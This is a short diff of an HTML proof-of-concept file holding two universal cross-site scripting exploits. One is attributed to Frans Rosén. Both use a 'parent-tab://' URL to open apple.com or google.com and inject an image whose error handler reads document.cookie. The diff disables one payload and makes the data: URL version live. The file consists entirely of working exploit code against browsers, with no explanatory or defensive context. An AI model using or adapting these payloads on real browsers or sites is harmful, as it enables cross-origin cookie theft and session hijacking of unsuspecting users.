@@ -1,6 +1,6 @@
 <!-- Local SOP bypass -->
-<script> function Pew(){var doc=open('parent-tab://apple.com');doc.document.body.innerHTML='<img src=q onerror=alert(document.cookie)>';}</script><button onclick=Pew();>Click me!</button>
+<!-- <script> function Pew(){var doc=open('parent-tab://apple.com');doc.document.body.innerHTML='<img src=q onerror=alert(document.cookie)>';}</script><button onclick=Pew();>Click me!</button> -->
 
 
 <!-- uxss Exploit by Frans Rosén -->
-<!-- data:text/html,<script>function y(){x=open('parent-tab://google.com','_top'),x.document.body.innerHTML='<img/src=""onerror="alert(document.cookie)">'};setTimeout(y,100)</script> -->
+data:text/html,<script>function y(){x=open('parent-tab://google.com','_top'),x.document.body.innerHTML='<img/src=""onerror="alert(document.cookie)">'};setTimeout(y,100)</script>
